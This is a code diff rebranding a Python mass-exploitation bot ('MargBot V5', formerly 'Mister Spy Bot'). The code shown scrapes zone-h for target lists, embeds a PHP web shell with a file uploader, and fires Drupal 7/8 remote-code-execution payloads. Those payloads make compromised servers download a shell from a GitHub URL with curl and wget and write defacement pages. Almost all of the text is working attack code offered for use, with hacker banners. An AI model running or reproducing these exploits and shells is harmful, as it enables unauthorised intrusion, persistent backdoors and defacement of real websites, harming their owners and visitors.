@@ -1,11 +1,3 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-
-#Ne touche pas le script -_-
-#Don't Edit Logo plz -_-
-
-
 import requests, httplib, urllib, urllib3, urllib2, codecs
 from urllib import urlopen as o
 import socket
@@ -79,18 +71,18 @@ def zonehh():
 		
 
 		for i in range(1, 51):
-			dz = requests.get(url + notf +"/page=" + str(i), cookies=my_cook)
-			dzz = dz.content
+			req = requests.get(url + notf +"/page=" + str(i), cookies=my_cook)
+			reqq_pars = req.content
 			print(url + notf +"/page=" + str(i))
-			if '<html><body>-<script type="text/javascript"' in dzz:
+			if '<html><body>-<script type="text/javascript"' in reqq_pars:
 				print("Change Cookies Please")
 				sys.exit()
-			elif '<input type="text" name="captcha" value=""><input type="submit">' in dzz:
+			elif '<input type="text" name="captcha" value=""><input type="submit">' in reqq_pars:
 				print("Entre Captcha In Zone-h From Ur Browser :/")
-				sys.exit()	
+				sleep(10)
 			else:
-				Hunt_urls = re.findall('<td>(.*)\n							</td>', dzz)
-				if '/mirror/id/' in dzz:
+				Hunt_urls = re.findall('<td>(.*)\n							</td>', reqq_pars)
+				if '/mirror/id/' in reqq_pars:
 					for xx in Hunt_urls:
 						qqq = xx.replace('...','')
 						print '    ['  + '*' + '] ' + qqq.split('/')[0]
@@ -112,23 +104,22 @@ def zonehh():
 				}
 		for qwd in range(1, 51):
 			rb = requests.get(urll + "/page=" + str(qwd) , cookies=my_cook)
-			dzq = rb.content
+			reqq_par = rb.content
 
-			if '<html><body>-<script type="text/javascript"' in dzq:
+			if '<html><body>-<script type="text/javascript"' in reqq_par:
 				print("Change Cookies Plz")
-				sys.exit()
-				
-			elif "captcha" in dzq:
+				slepp(10)				
+			elif "captcha" in reqq_par:
 				print("Entre captcha In Your Browser Of Site [zone-h.org]")
 			else:
-				Hunt_urlss = re.findall('<td>(.*)\n							</td>', dzq)
+				Hunt_urlss = re.findall('<td>(.*)\n							</td>', reqq_par)
 				for xxx in Hunt_urlss:
 					qqqq = xxx.replace('...','')
 					print '    ['  + '*' + '] ' + qqqq.split('/')[0]
 					with open('onhold_zone.txt', 'a') as rrr:
 						rrr.write("http://" + qqqq.split('/')[0] + '\n')
 	else:
-		print("Fuck You Men")
+		print("Mkelekh dzeb")
 
 def zonehBR():
 	print("""
@@ -151,18 +142,18 @@ def zonehBR():
 		
 
 		for i in range(1, 51):
-			dz = requests.get(url3 + notf +"/page=" + str(i), cookies=my_cook)
-			dzz = dz.content
+			reqqq = requests.get(url3 + notf +"/page=" + str(i), cookies=my_cook)
+			reqq_parss = reqqq.content
 			print(url + notf +"/page=" + str(i))
-			if '<html><body>-<script type="text/javascript"' in dzz:
+			if '<html><body>-<script type="text/javascript"' in reqq_parss:
 				print("Change Cookies Please")
 				sys.exit()
-			elif '<input type="text" name="captcha" value=""><input type="submit">' in dzz:
+			elif '<input type="text" name="captcha" value=""><input type="submit">' in reqq_parss:
 				print("Entre Captcha In Zone-h From Ur Browser :/")
 				sys.exit()	
 			else:
-				Hunt_urls = re.findall('<td>(.*)\n							</td>', dzz)
-				if '/mirror/id/' in dzz:
+				Hunt_urls = re.findall('<td>(.*)\n							</td>', reqq_parss)
+				if '/mirror/id/' in reqq_parss:
 					for xx in Hunt_urls:
 						qqq = xx.replace('...','')
 						print '    ['  + '*' + '] ' + qqq.split('/')[0]
@@ -183,24 +174,23 @@ def zonehBR():
 			"PHPSESSID" : izan
 				}
 		for qwd in range(1, 51):
-			rb = requests.get(url33 + "/page=" + str(qwd) , cookies=my_cook)
-			dzq = rb.content
+			reqq = requests.get(url33 + "/page=" + str(qwd) , cookies=my_cook)
+			reqqqqqq_parssssing = rb.content
 
-			if '<html><body>-<script type="text/javascript"' in dzq:
+			if '<html><body>-<script type="text/javascript"' in reqqqqqq_parssssing:
 				print("Change Cookies Plz")
-				sys.exit()
-				
-			elif "captcha" in dzq:
+				sleep(10)				
+			elif "captcha" in reqqqqqq_parssssing:
 				print("Entre captcha In Your Browser Of Site [zone-h.org]")
 			else:
-				Hunt_urlss = re.findall('<td>(.*)\n							</td>', dzq)
+				Hunt_urlss = re.findall('<td>(.*)\n							</td>', reqqqqqq_parssssing)
 				for xxx in Hunt_urlss:
 					qqqq = xxx.replace('...','')
 					print '    ['  + '*' + '] ' + qqqq.split('/')[0]
 					with open('onhold_zoneBR.txt', 'a') as rrr:
 						rrr.write("http://" + qqqq.split('/')[0] + '\n')
 	else:
-		print("Fuck You Men")
+		print("Mkelekh dzeb")
 
 def mirroirh():
 	print("""
@@ -288,7 +278,7 @@ def add_http():
 	for i in dz:
 		i = i.rstrip()
 		print("http://"+i)
-		with open( 'aziz.txt', 'a') as rr:
+		with open( 'listzz.txt', 'a') as rr:
 			rr.write("http://" + i + '\n')
 	print("Text Saved !!")
 
@@ -363,7 +353,7 @@ def binger():
 		                		s.writelines((o[0]+'//'+o[2])+'\n')
 		   		page = page+5
 	else:
-		print("dir numero azbi nooooooob")
+		print("Mkelekh dzeb")
 
 
 def cms_detected():
@@ -413,46 +403,19 @@ def cms_detected():
 		except:
 			pass
 
-def botv1():
-
-	def clearscrn():
-	    if system() == 'Linux':
-	        os.system('clear')
-	    if system() == 'Windows':
-	        os.system('cls')
-	        os.system('color a')
-	clearscrn()
-
+def botv5():
 	def slowprint(s):
 	    for c in s + '\n':
 	        sys.stdout.write(c)
 	        sys.stdout.flush()
 	        time.sleep(4. / 100)
 
-	def print_logo():
-	    clear = "\x1b[0m"
-	    colors = [36, 32, 34, 35, 31, 37]
-
-	    x = """
-
-	                             _       _       _  ___ _ _____      
-	   / \   _ __ ___   __ _ ___(_) __ _| |__   | |/ (_) |___ / _ __ 
-	  / _ \ | '_ ` _ \ / _` |_  / |/ _` | '_ \  | ' /| | | |_ \| '__|
-	 / ___ \| | | | | | (_| |/ /| | (_| | | | | | . \| | |___) | |   
-	/_/   \_\_| |_| |_|\__,_/___|_|\__, |_| |_| |_|\_\_|_|____/|_|   
-	                               |___/                             
-			  
-	                                  Script Name : Mnanok Tester ^_^
-	                	Greetz To : \033[93mKabyles \033[92mHackers  \033[91m|D\033[92mz| \033[91mAlgeria \033[92mHackers
-	"""
-	    for N, line in enumerate(x.split("\n")):
-	        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
-	        time.sleep(0.05)
-
-
-
-	print_logo()
-	slowprint("\n\t\t\t\t\tPowered By : Trojan Kil3r Amazigh / Aziz" + "\n\t\t\t\t\t\t            Facebook : fb.com/amazigh.kil3r")
+	bb = open('Files/banner.txt', 'r').read()
+    	clr = "\x1b[0m"
+    	colors = [36, 32, 34, 35, 31, 37]
+    	for N, line in enumerate(bb.split("\n")):
+			sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clr))
+	slowprint("\n\t\t\t\t\tPowered By : MarGus" + "\n\t\t\t\t     Moore than 300 ExpLoiTs :D")
 	start_raw = raw_input("\n\033[92m[!]\033[91m WELCOME TO HELL ENTER LIST OF WEBSITES : ")
 	try:
 	    with open(start_raw, 'r') as f:
@@ -464,11 +427,11 @@ def botv1():
 			
 
 	shell = """<?php
-	$str = 'TWlzdGVyU3B5U2hlbGxGb3JWN0JvdDBYX2lzdGFuYnVsXzIwMTk=';echo base64_decode($str);
+	$str = 'TWFyR3VzRlJvbTEzMzdTY2hvb2w=';echo base64_decode($str);
 
 	?>
-	<title>Mister Spy Bot V7</title>
-	<?php echo 'MisterSpyShellForV7Bot0X_istanbul_2019 uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+	<title>MargBot V5</title>
+	<?php echo 'MarGusFRom1337School uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
 	?>"""
 	shell_name = str(time.time())[:-3]
 	filenamex = "up_"+str(shell_name)+".php.php"
@@ -478,18 +441,18 @@ def botv1():
 	path = str(time.time())[:-3]
 	jceupshell = "Files/up.php"
 	filte = "Files/up.php"
-	fck = "Files/spy.txt"
+	fck = "Files/mrgs.txt"
 	imagess = "Files/pwn.gif"
-	indecx = "Files/spy.html"
+	indecx = "Files/mrgs.html"
 	filevid = "Files/mah.PhP.txt"
-	indexxx = "Files/spy.txt"
+	indexxx = "Files/mrgs.txt"
 	louis = "Files/up.php"
-	payloadz = "<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"
+	payloadz = "<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"
 	com_jdownloads = 'Files/up.php3.g'
 	com_jdownloads_index = 'Files/pwn.gif'
 	Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
 	user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
-	payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Manager.php','w+'),file_get_contents('https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Fuckedz.htm','w+'),' Vulnerability! Fuckedz By En Banglasia! ');"""
+	payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Manager.php','w+'),file_get_contents('https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Fuckedz.htm','w+'),' Vulnerability! Fuckedz By En Banglasia! ');"""
 	filenames = "Files/up.php"
 	def rand_str (len = None) :
 		if len == None :
@@ -662,7 +625,7 @@ def botv1():
 			#1
 
 
-			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php', 'name[#type]':'markup'}
+			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php', 'name[#type]':'markup'}
 			post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
 			r = requests.post(url, data=post_params, params=get_params)
 			
@@ -685,7 +648,7 @@ def botv1():
 			
 			else:
 				print '\033[92m[>] \033[0mExploit Drupal 7  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
-			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php', 'name[#type]':'markup'}
+			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php', 'name[#type]':'markup'}
 			post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
 			r = requests.post(url, data=post_params, params=get_params)
 			
@@ -711,7 +674,7 @@ def botv1():
 			#2
 
 
-			Index_page = "echo 'Defaced By Mister Spy' > def.htm"
+			Index_page = "echo 'Defaced By MarGus' > def.htm"
 			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]': Index_page, 'name[#type]': 'markup'}
 			post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
 			r = requests.post(url, data=post_params, params=get_params)
@@ -728,7 +691,7 @@ def botv1():
 			lib = requests.get(url+'/def.htm')
 			
 			
-			if re.findall("Defaced By Mister Spy", lib.content):
+			if re.findall("Defaced By MarGus", lib.content):
 				print '\033[92m[>] \033[0mExploit Drupal 7 Index  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
 
@@ -736,7 +699,7 @@ def botv1():
 				print '\033[92m[>] \033[0mExploit Drupal 7 Index  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
 
 			
-			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php', 'name[#type]':'markup'}
+			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php', 'name[#type]':'markup'}
 			post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
 			r = requests.post(url, data=post_params, params=get_params)
 			
@@ -752,7 +715,7 @@ def botv1():
 			lib = requests.get(url+'/up.php')
 			
 			
-			if re.findall("MisterSpyShellForV7Bot0X_istanbul_2019", lib.content):
+			if re.findall("MarGusFRom1337School", lib.content):
 				print '\033[92m[>] \033[0mExploit Drupal 7.2  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
 				sys.exit()
@@ -762,7 +725,7 @@ def botv1():
 			#3
 
 
-			Index_page = "echo 'Defaced By Mister Spy' > def.htm"
+			Index_page = "echo 'Defaced By MarGus' > def.htm"
 			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]': Index_page, 'name[#type]': 'markup'}
 			post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
 			r = requests.post(url, data=post_params, params=get_params)
@@ -779,14 +742,14 @@ def botv1():
 			lib = requests.get(url+'/def.htm')
 			
 			
-			if re.findall("Defaced By Mister Spy", lib.content):
+			if re.findall("Defaced By MarGus", lib.content):
 				print '\033[92m[>] \033[0mExploit Drupal 7.3  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
 
 			else:
 				print '\033[92m[>] \033[0mExploit Drupal 7.3  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
 
-			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
+			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'}
 			headers = {'User-Agent': 'Mozilla 5.0'}				
 			r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
 			if 'SpyUploaderV1' in requests.get(url+'/up.php', verify=False, headers=headers).text:
@@ -798,7 +761,7 @@ def botv1():
 
 
 				
-			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
+			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'}
 			headers = {'User-Agent': 'Mozilla 5.0'}				
 			r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
 			if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
@@ -808,7 +771,7 @@ def botv1():
 			else:
 				print '\033[92m[>] \033[0mExploit Drupal 8  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
 
-			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'exec', 'mail["a"][#lazy_builder][1][]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
+			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'exec', 'mail["a"][#lazy_builder][1][]': 'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'}
 			headers = {'User-Agent': 'Mozilla 5.0'}				
 			r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
 			if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
@@ -818,7 +781,7 @@ def botv1():
 			else:
 				print '\033[92m[>] \033[0mExploit Drupal 8.1  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
 
-			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'timezone[a][#lazy_builder][]': 'exec', 'timezone[a][#lazy_builder][][]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
+			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'timezone[a][#lazy_builder][]': 'exec', 'timezone[a][#lazy_builder][][]': 'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'}
 			headers = {'User-Agent': 'Mozilla 5.0'}				
 			r = requests.post(url+ '/user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
 			if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
@@ -829,7 +792,7 @@ def botv1():
 				print '\033[92m[>] \033[0mExploit Drupal 8.2  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			
 
 					
-			r = requests.post(url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php"})
+			r = requests.post(url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php"})
 			if 'SpyUploaderV1' in requests.get(url+'/up.php').text:
 				print '\033[92m[>] \033[0mExploit Drupal 8.3  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
@@ -839,7 +802,7 @@ def botv1():
 
 			headers = {'User-Agent': 'Mozilla 5.0'}	
 			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
-	                   'mail[#type]': 'markup', 'mail[#markup]': 'echo MisterSpyShellForV7Bot0X_istanbul_2019!! Defaced it Now!> def.htm'}
+	                   'mail[#type]': 'markup', 'mail[#markup]': 'echo MarGusFRom1337School!! Defaced it Now!> def.htm'}
 			payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "' + shell + '"> vuln.php'}			
 			ar = requests.post(url+'/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, timeout=5)
 			if 'Defaced' in requests.get(url+'/vuln.htm', headers=headers).text:
@@ -859,7 +822,7 @@ def botv1():
 			#4
 
 
-			Index_page = "echo 'Defaced By Mister Spy ' > def.htm"
+			Index_page = "echo 'Defaced By MarGus ' > def.htm"
 			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]': Index_page, 'name[#type]': 'markup'}
 			post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
 			r = requests.post(url, data=post_params, params=get_params)
@@ -876,7 +839,7 @@ def botv1():
 			lib = requests.get(url+'/def.htm')
 			
 			
-			if re.findall("Defaced By Mister Spy", lib.content):
+			if re.findall("Defaced By MarGus", lib.content):
 				print '\033[92m[>] \033[0mExploit Drupal 7.4  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
 
@@ -884,7 +847,7 @@ def botv1():
 				print '\033[92m[>] \033[0mExploit Drupal 7.4  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
 				
 
-			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
+			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'}
 			headers = {'User-Agent': 'Mozilla 5.0'}				
 			r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
 			if 'SpyUploaderV1' in requests.get(url+'/up.php', verify=False, headers=headers).text:
@@ -896,7 +859,7 @@ def botv1():
 
 
 				
-			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
+			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'}
 			headers = {'User-Agent': 'Mozilla 5.0'}				
 			r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
 			if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
@@ -906,7 +869,7 @@ def botv1():
 			else:
 				print '\033[92m[>] \033[0mExploit Drupal 8.5  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
 
-			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'exec', 'mail["a"][#lazy_builder][1][]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
+			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'exec', 'mail["a"][#lazy_builder][1][]': 'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'}
 			headers = {'User-Agent': 'Mozilla 5.0'}				
 			r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
 			if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
@@ -915,7 +878,7 @@ def botv1():
 				sys.exit()	
 			else:
 				print '\033[92m[>] \033[0mExploit Drupal 8.6  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
-			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'timezone[a][#lazy_builder][]': 'exec', 'timezone[a][#lazy_builder][][]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
+			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'timezone[a][#lazy_builder][]': 'exec', 'timezone[a][#lazy_builder][][]': 'curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php'}
 			headers = {'User-Agent': 'Mozilla 5.0'}				
 			r = requests.post(url+ '/user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
 			if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
@@ -926,7 +889,7 @@ def botv1():
 				print '\033[92m[>] \033[0mExploit Drupal 8.7  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			
 
 					
-			r = requests.post(url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php"})
+			r = requests.post(url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "curl https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php && wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php"})
 			if 'SpyUploaderV1' in requests.get(url+'/up.php').text:
 				print '\033[92m[>] \033[0mExploit Drupal 8.8  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
@@ -936,10 +899,10 @@ def botv1():
 
 			headers = {'User-Agent': 'Mozilla 5.0'}	
 			payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
-	                   'mail[#type]': 'markup', 'mail[#markup]': 'echo Defaced  By Mister Spy!> def.htm'}
+	                   'mail[#type]': 'markup', 'mail[#markup]': 'echo Defaced  By MarGus!> def.htm'}
 			payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "' + shell + '"> vuln.php'}			
